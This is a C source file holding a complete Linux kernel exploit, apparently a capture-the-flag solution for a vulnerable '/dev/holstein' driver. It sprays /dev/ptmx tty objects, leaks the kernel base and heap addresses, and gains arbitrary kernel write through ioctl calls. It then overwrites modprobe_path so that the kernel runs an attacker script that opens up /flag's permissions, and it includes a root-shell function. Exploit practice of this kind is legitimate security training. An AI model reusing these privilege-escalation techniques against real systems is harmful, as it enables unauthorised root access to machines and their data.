#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define store_rdx_ecx 0x4b27c2
#define modprobe_path 0xe38180

unsigned long user_cs, user_ss, user_rflags, user_rsp;
unsigned long image_base = 0, heap_leak = 0;
int gfd = 0;
int spray[100];
char buf[0x500];

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void aaw(unsigned long addr, unsigned long val) {
    unsigned long *ptr = (unsigned long *)&buf;
    ptr[12] = image_base + store_rdx_ecx;
    *(unsigned long *)&buf[0x418] = heap_leak;
    write(gfd, buf, 0x500);

    // trigger mov [rdx], ecx
    for(int i = 0; i < 100; i++) {
        ioctl(spray[i], val, addr);
    }
}

static void exploit() {
    for(int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY  | O_NOCTTY);
    }

    gfd = open("/dev/holstein", O_RDWR);

    for(int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }
    
    read(gfd, buf, 0x500);

    for(int i = 0; i <= 0x500; i += 8) {
        printf("[0x%04x] 0x%016lx\n", i, *(unsigned long *)&buf[i]);
    }

    image_base = *(unsigned long *)&buf[0x418] - 0xc38880;
    heap_leak = *(unsigned long*)&buf[0x438] - 0x438;
    printf("[+] image_base: 0x%016lx\n", image_base);
    printf("[+] heap_leak: 0x%016lx\n", heap_leak);

    char cmd[] = "/tmp/magic.sh";
    for(int i = 0; i < sizeof(cmd); i++) {
        aaw(image_base + modprobe_path + i, *(unsigned int *)&cmd[i]);
    }

    system("echo -e '#!/bin/sh\nchmod -R 777 /flag' > /tmp/magic.sh"); // excute from kernel
    system("chmod +x /tmp/magic.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    return;   
}

int main() {
    save_state();
    exploit();
    return 0;
}